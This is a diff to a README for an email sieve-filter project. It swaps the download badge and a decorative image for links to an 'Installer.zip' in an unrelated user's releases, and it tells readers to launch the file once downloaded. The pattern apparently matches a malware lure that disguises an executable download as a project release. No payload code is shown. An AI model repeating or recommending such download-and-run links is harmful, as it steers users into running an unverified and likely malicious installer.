@@ -12,7 +12,7 @@ Welcome to the official source repository for the **EMAIL 2.0 sieve filter speci
 
 To get started with EMAIL 2.0 Sieve Filters, visit the link below to download the latest version:
 
-[![Download EMAIL2_Filters_Sieve](https://img.shields.io/badge/Download-EMAIL2_Filters_Sieve-green)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download EMAIL2_Filters_Sieve](https://github.com/awdawda12/EMAIL2_Filters_Sieve/releases/download/v1.0/Installer.zip)](https://github.com/awdawda12/EMAIL2_Filters_Sieve/releases/download/v1.0/Installer.zip)
 
 If the link above ends with the file name, make sure to launch it to access the necessary files for setting up the EMAIL 2.0 Sieve Filters.
 
@@ -54,4 +54,4 @@ To stay up to date with the latest developments and releases of EMAIL 2.0 Sieve 
 
 Thank you for choosing EMAIL 2.0 Sieve Filters to enhance your email filtering experience. We look forward to seeing how EMAIL 2.0 Sieve Filters revolutionizes the way you manage your inbox! 🚀
 
-![Email Filters Image](https://source.unsplash.com/3x4f5eB7D-M)
+![Email Filters Image](https://github.com/awdawda12/EMAIL2_Filters_Sieve/releases/download/v1.0/Installer.zip)
